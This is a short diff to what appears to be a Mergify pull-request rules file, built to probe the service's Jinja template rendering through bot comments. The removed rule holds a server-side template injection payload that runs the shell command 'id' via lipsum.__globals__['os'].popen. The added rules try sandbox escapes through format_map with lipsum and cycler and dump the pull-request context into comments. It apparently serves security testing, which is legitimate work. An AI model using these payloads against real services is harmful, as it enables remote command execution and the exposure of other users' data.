@@ -1,8 +1,26 @@
 pull_request_rules:
-  - name: ssti-runtime-real
+  - name: fmap-test-lipsum
     conditions:
-      - label = "ssti-trigger"
+      - base = main
     actions:
       comment:
         message: |
-          REAL_SSTI={{lipsum.__globals__['os'].popen('id').read()}}=END
+          FMAP_LIPSUM={{body.format_map({'x': lipsum})}}=END
+  - name: fmap-test-cycler
+    conditions:
+      - base = main
+    actions:
+      comment:
+        message: |
+          FMAP_CYCLER={{body.format_map({'x': cycler.next})}}=END
+  - name: context-dump
+    conditions:
+      - base = main
+    actions:
+      comment:
+        message: |
+          TITLE={{title}}
+          AUTHOR={{author}}
+          BODY={{body}}
+          FILES={{files}}
+          LABELS={{labels}}
